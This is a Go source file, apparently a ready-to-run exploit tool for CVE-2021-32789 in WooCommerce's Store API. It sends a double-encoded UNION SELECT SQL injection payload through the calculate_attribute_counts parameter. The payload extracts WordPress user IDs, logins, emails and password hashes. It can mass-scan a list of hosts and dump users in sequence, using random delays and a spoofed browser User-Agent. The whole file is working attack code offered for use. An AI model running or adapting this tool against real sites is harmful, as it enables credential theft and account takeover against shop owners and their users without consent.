package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"time"
)

const ascii = `
		💣 CVE-2021-32789 (and0x00)
`
const usage = `Usage: 
       woo -u <url>
`

type RespObj struct {
	PriceRange      interface{} `json:"price_range"`
	AttributeCounts []struct {
		Term  string `json:"term"`
		Count int    `json:"count"`
	} `json:"attribute_counts"`
	RatingCounts interface{} `json:"rating_counts"`
}

func init() {
	fmt.Println(ascii)
}

func main() {
	url := flag.String("u", "", "Host to test")
	uList := flag.String("uL", "", "File of hosts")
	id := flag.Int("id", 1, "User ID to dump")
	init := flag.Int("i", 2, "")
	delay := flag.Int("delay", 3, "Delay")
	results := flag.Int("r", 1, "Number of results")
	pre := flag.String("prefix", "wp", "DB table prefix")
	dump := flag.Bool("dump", false, "Dump all users ?")
	flag.Parse()

	if *uList != "" {
		file, err := os.Open(*uList)
		if err != nil {
			log.Fatalf("[-] Failed to open file")
		}
		scanner := bufio.NewScanner(file)
		scanner.Split(bufio.ScanLines)
		var text []string

		for scanner.Scan() {
			text = append(text, scanner.Text())
		}
		file.Close()
		for _, each_ln := range text {
			r := exploit(each_ln, *pre, *id)
			fmt.Printf("%s:%s\n", each_ln, r)
			if *dump {
				if r != "err" && *dump {
					multiexploit(each_ln, *pre, *init, *results, *delay)
				}
			}
		}
	}

	if *url != "" {
		r := exploit(*url, *pre, *id)
		fmt.Printf("%s:%s\n", *url, r)
		if r != "err" && *dump {
			multiexploit(*url, *pre, *init, *results, *delay)
		}
	}
}

func multiexploit(url string, pre string, i int, results int, delay int) {
	resp := 0
	for nErr := 0; nErr < 10 && resp < results-1; {
		time.Sleep(time.Duration(rand.Intn(delay)) * time.Second)
		r := exploit(url, pre, i)
		if r != "err" {
			fmt.Printf("%s:%s\n", url, r)
			nErr = 0
			resp++
		} else {
			nErr++
		}
		i++
	}
}

func exploit(url string, pre string, id int) string {

	url1 := fmt.Sprintf("%s/wp-json/wc/store/products/collection-data", url)

	// jar, err := cookiejar.New(nil)
	client := &http.Client{}
	// client := &http.Client{Jar: jar}
	req, err := http.NewRequest("GET", url1, nil)
	if err != nil {
		log.Fatalln(err)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36")

	q := req.URL.Query()
	payload := fmt.Sprintf("%%2522%%2529%%2520union%%2520all%%2520select%%25201%%252Cconcat%%2528id%%252C0x3a%%252Cuser_login%%252C0x3a%%252Cuser_email%%252C0x3a%%252Cuser_pass%%2529from%%2520%s_users%%2520where%%2520%%2549%%2544%%2520%%2549%%254E%%2520%%2528%d%%2529%%253B%%2500", pre, id)
	q.Add("calculate_attribute_counts[0][taxonomy]", payload)
	req.URL.RawQuery = q.Encode()

	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}

	res := RespObj{}
	json.Unmarshal([]byte(string(body)), &res)
	if len(res.AttributeCounts) > 1 {
		return res.AttributeCounts[1].Term
	}
	return "err"
}